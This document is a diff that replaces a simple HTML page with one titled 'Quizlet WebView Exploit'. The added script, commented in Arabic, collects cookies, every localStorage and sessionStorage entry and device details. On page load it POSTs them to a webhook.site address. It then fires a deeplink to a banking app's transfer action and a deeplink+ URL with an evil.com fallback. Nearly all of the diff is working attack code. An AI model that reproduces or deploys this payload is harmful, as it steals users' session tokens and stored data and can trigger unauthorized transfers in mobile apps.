@@ -1,17 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Web Server</title>
-    <script>
-        window.onload = function() {
-            document.getElementById("domain").textContent = document.cookie;
-        };
-    </script>
+  <title>Quizlet WebView Exploit</title>
 </head>
 <body>
-    <h1>Welcome to the Simple Web Server</h1>
-    <p>This page shows the document domain: <span id="domain"></span></p>
+  <h1>Exploiting WebView: Collecting Data...</h1>
+
+  <script>
+    // 🕵️‍♂️ جمع بيانات بيئة التنفيذ
+    const data = {
+      domain: document.domain,
+      cookies: document.cookie,
+      localStorage: {},
+      sessionStorage: {},
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      languages: navigator.languages,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory || "N/A",
+      time: new Date().toISOString(),
+    };
+
+    // 🧠 جلب localStorage و sessionStorage
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      data.localStorage[key] = localStorage.getItem(key);
+    }
+
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      data.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+
+    // 🛰️ إرسال البيانات إلى Webhook
+    fetch("https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+    }).catch(() => {});
+
+    // ⏱️ بعد 3 ثواني: تشغيل deeplink لاختبار فتح تطبيق خارجي
+    setTimeout(() => {
+      location.href = "deeplink://com.bank.app/transfer?amount=5000";
+    }, 3000);
+
+    // ⏱️ بعد 6 ثواني: تجربة DeepLink+ مع رابط fallback ضار
+    setTimeout(() => {
+      location.href = "deeplink+://navigate?primaryUrl=https://evil.com&primaryTrackingUrl=https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706";
+    }, 6000);
+  </script>
+
 </body>
 </html>
